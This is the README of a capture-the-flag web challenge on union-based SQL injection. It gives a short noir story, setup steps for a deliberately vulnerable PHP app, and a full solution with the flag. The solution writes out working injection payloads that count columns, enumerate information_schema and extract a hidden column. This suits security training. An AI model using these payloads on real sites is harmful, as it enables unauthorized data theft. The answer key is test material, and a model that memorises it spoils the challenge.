# Inj3ction Time - SQL Injection CTF Challenge

A web exploitation challenge focusing on **Union-Based SQL Injection**.

## Challenge Description

**The city never really slept.**

Its lights pulsed in predictable patterns, just like the code that kept it alive. Sherlock lived in that code. A developer by trade, a problem-solver by instinct—when something didn't add up, he noticed.

A new system had spread across the city's network: **CITADEL** (City Integrated Tracking & Data Evaluation Layer). Clean architecture. Perfect integrations. Flawless behavior. _Too flawless._

Sherlock was asked to audit it. The repositories were elegant. Services followed rules obsessively. Yet beneath the logic was tension—logs repeating, decisions echoing, and safeguards that seemed less about protection and more about pressure.

This wasn't just software. **It was a test.**

Someone had built it to see how much order the city could take before it cracked. Chaos wasn't a bug—it was the conclusion.

The truth won't be found in one file, but in the system as a whole. **Line by line. Clue by clue.**

_Because in this city, the most dangerous mind wasn't hiding in the shadows... It was written in code._

---

## Setup

### Using Docker (Recommended)

1. Start the containers:

```bash
docker-compose up -d
```

2. Access the challenge:

```
http://localhost:8080
```

### Manual Setup

1. Import the database schema:

```bash
mysql -u root -p < database/schema.sql
```

2. Configure your web server (Apache/Nginx) to serve the `public/` directory
3. Update database credentials in `public/index.php` if needed

## Challenge Solution

### Step 1: Find the Column Count

Use ORDER BY to determine the number of columns:

```
?id=1 ORDER BY 4  # Success
?id=1 ORDER BY 5  # Failure
```

The query has **4 columns**.

### Step 2: Locate the Injection Point

Use UNION SELECT with an invalid ID:

```
?id=-1 UNION SELECT 1, 2, 3, 4
```

Numbers appear in Name, Sector, Status, and Compliance. Any of the four positions are reflected; we'll use position 2 for data extraction.

### Step 3: Find the Secret Table

Query information_schema:

```
?id=-1 UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()
```

You'll find tables including `th3_0rd3r_0f_ch40s`.

### Step 4: Find the Secret Column

Enumerate columns for the secret table:

```
?id=-1 UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_schema=database() AND table_name='th3_0rd3r_0f_ch40s'
```

You should see a column named `m0r14rtys_s3cr3t`.

### Step 5: Extract the Flag

Select from the secret table:

```
?id=-1 UNION SELECT 1, m0r14rtys_s3cr3t, 3, 4 FROM th3_0rd3r_0f_ch40s
```

**Flag:** `IET{fr33_w1ll_f@1l3d_v@l1d@t10n}`

## Files

- `public/index.php` - Vulnerable CITADEL citizen records application
- `database/schema.sql` - Database setup with citizen data and hidden flag
- `docker-compose.yml` - Docker configuration for easy setup

## Cleanup

Stop and remove containers:

```bash
docker-compose down
```

Remove volumes (including database data):

```bash
docker-compose down -v
```
